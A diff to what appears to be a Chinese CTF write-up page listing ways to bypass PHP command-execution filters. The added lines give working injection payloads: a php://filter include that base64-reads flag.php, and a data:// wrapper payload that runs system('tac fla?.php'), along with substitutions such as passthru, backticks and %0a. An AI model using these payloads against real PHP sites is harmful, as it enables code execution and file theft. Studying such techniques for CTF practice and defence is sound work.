@@ -24,6 +24,8 @@
 <li>过滤了 <strong>system 函数名</strong>：可以尝试用 <code>passthru</code>或反引号代替。</li>
 <li>过滤了 <strong>cat 命令</strong>&lt;可以使用&gt; tac（反向输出）代替。</li>
 <li>过滤了 <strong>;</strong>&lt;可以用&gt;<code>?&gt;</code>或者<code>%0a</code>代替。</li>
+<li>过滤了 <strong>()</strong> 可以用文件包含：大概样子是这样<code>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code>这里是为了绕过所以用了php://filter伪协议过滤和Base64编码。</li>
+<li>使用data伪协议(由于过滤了flag使用占位符和php）：<code>?c=data://text/plain,&lt;?php system("tac%20fla?.php");?&gt;</code></li>
 </ul></section></section>
 <section><h1>WP<a href="#wp"><span>#</span></a></h1><ul>
 <li>
